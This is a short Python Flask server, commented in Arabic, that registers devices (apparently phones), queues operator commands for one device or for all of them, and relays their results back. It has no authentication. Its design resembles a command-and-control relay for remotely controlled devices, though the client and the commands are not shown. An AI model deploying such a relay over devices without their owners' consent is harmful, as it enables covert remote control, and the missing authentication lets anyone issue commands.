from flask import Flask, request, jsonify
import threading
import time

app = Flask(__name__)

# تخزين البيانات
devices = {}  # {device_id: device_name}
pending_commands = {}  # {device_id: [commands]}
pending_results = {}  # {device_id: [results]}

# ===== تسجيل جهاز جديد =====
@app.route('/register', methods=['POST'])
def register():
    data = request.json
    device_id = data.get('device_id')
    device_name = data.get('device_name')
    if device_id:
        devices[device_id] = device_name
        print(f"📱 Device registered: {device_id} ({device_name})")
        return jsonify({'status': 'registered'}), 200
    return jsonify({'error': 'Missing device_id'}), 400

# ===== إرسال أمر إلى جهاز =====
@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.json
    target = data.get('target')  # device_id أو "ALL"
    command = data.get('command')
    
    if target == "ALL":
        for dev_id in devices.keys():
            if dev_id not in pending_commands:
                pending_commands[dev_id] = []
            pending_commands[dev_id].append(command)
        return jsonify({'status': 'sent_to_all'}), 200
    elif target in devices:
        if target not in pending_commands:
            pending_commands[target] = []
        pending_commands[target].append(command)
        return jsonify({'status': 'sent'}), 200
    return jsonify({'error': 'Device not found'}), 404

# ===== جلب أوامر الجهاز =====
@app.route('/get_commands/<device_id>', methods=['GET'])
def get_commands(device_id):
    if device_id in pending_commands and pending_commands[device_id]:
        cmd = pending_commands[device_id].pop(0)
        return jsonify({'command': cmd}), 200
    return jsonify({'command': None}), 200

# ===== إرسال نتيجة من جهاز =====
@app.route('/send_result', methods=['POST'])
def send_result():
    data = request.json
    device_id = data.get('device_id')
    result = data.get('result')
    if device_id:
        if device_id not in pending_results:
            pending_results[device_id] = []
        pending_results[device_id].append(result)
        return jsonify({'status': 'result_received'}), 200
    return jsonify({'error': 'Missing device_id'}), 400

# ===== جلب نتائج الجهاز =====
@app.route('/get_results/<device_id>', methods=['GET'])
def get_results(device_id):
    if device_id in pending_results and pending_results[device_id]:
        result = pending_results[device_id].pop(0)
        return jsonify({'result': result}), 200
    return jsonify({'result': None}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)